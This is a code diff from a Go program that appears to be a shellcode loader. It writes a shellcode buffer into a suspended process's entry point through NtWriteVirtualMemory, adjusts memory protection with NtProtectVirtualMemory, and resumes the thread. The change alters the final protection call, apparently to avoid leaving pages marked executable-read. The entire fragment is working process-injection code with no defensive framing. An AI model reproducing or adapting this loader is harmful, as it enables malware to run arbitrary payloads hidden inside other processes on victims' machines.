@@ -159,18 +159,23 @@ func main(){
 	//WriteProcessMemory := k32.NewProc("WriteProcessMemory")
 	//WriteProcessMemory.Call(uintptr(pi.Process), codeEntry, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),0)
 
+
 	NTWVM := syscall.NewLazyDLL("ntdll").NewProc("NtWriteVirtualMemory")
 	NtProtectVirtualMemory := syscall.NewLazyDLL("ntdll").NewProc("NtProtectVirtualMemory")
+
 	var old uintptr
 	NtProtect(NtProtectVirtualMemory,uintptr(pi.Process),codeEntry,uintptr(len(shellcode)),syscall.PAGE_READWRITE,&old)
 
+
 	NTWVM.Call(uintptr(pi.Process),codeEntry,uintptr(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)),0)
 
-	NtProtect(NtProtectVirtualMemory,uintptr(pi.Process),codeEntry,uintptr(len(shellcode)),syscall.PAGE_EXECUTE_READ,&old)
+	NtProtect(NtProtectVirtualMemory,uintptr(pi.Process),codeEntry,uintptr(len(shellcode)),old,&old)
 
 	windows.ResumeThread(pi.Thread)
 
 }
+
+
 
 func NtProtect(NtProtectVirtualMemory *syscall.LazyProc,pHndl uintptr,targetPtr uintptr, sSize uintptr,protect uintptr,oldProtect *uintptr)(uintptr,uintptr,error){
 	r1,r2,lastErr := NtProtectVirtualMemory.Call(
@@ -182,3 +187,4 @@ func NtProtect(NtProtectVirtualMemory *syscall.LazyProc,pHndl uintptr,targetPtr 
 	)
 	return r1,r2,lastErr
 }
+
